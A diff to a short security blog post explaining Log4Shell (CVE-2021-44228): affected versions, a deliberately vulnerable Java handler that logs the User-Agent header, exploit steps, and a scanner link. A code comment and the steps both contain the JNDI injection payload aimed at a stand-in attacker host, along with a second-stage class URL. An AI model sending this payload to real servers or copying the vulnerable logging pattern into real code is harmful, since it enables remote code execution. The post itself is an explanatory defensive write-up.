@@ -6,10 +6,13 @@ author: allencharp
 tags: [web-security, log4j, rce]
 ---
 
-# [Reference](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+# Reference
 
-# Affected Apache log4j Version
-2.0 <= Apache log4j <= 2.14.1
+[Log4Shell — CVE-2021-44228 analysis](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+
+# Affected Apache log4j versions
+
+`2.0 <= Apache log4j <= 2.14.1`
 
 {% highlight Java %}
 import java.io.*;
@@ -18,16 +21,16 @@ import java.util.*;
 
 public class VulnerableLog4jExampleHandler implements HttpHandler {
 
-  static Logger log = Logger.getLogger(log4jExample.class.getName());
+  static Logger log = Logger.getLogger(VulnerableLog4jExampleHandler.class.getName());
 
   /**
    * A simple HTTP endpoint that reads the request's User Agent and logs it back.
    * This is basically pseudo-code to explain the vulnerability, and not a full example.
    * @param he HTTP Request Object
-   */ 
+   */
   public void handle(HttpExchange he) throws IOException {
-    string userAgent = he.getRequestHeader("user-agent");
-    
+    String userAgent = he.getRequestHeader("user-agent");
+
     // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
     // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
     log.info("Request User Agent:" + userAgent);
@@ -41,11 +44,14 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
 }
 {% endhighlight %}
 
-# Exploit Steps​
-* Data from the User gets sent to the server (via any protocol),
-* The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server),
-* The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via "Java Naming and Directory Interface" (JNDI),
-* This response contains a path to a remote Java class file (ex. http://second-stage.attacker.com/Exploit.class) which is injected into the server process,
-* This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+# Exploit steps
 
-# Scan Tool: [log4j-scanner](https://github.com/cisagov/log4j-scanner)
+* Data from the user gets sent to the server (via any protocol),
+* The server logs the data in the request, containing the malicious payload: `${jndi:ldap://attacker.com/a}` (where attacker.com is an attacker-controlled server),
+* The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via "Java Naming and Directory Interface" (JNDI),
+* The response contains a path to a remote Java class file (e.g. `http://second-stage.attacker.com/Exploit.class`) which is injected into the server process,
+* The injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+
+# Scan tool
+
+[log4j-scanner](https://github.com/cisagov/log4j-scanner)
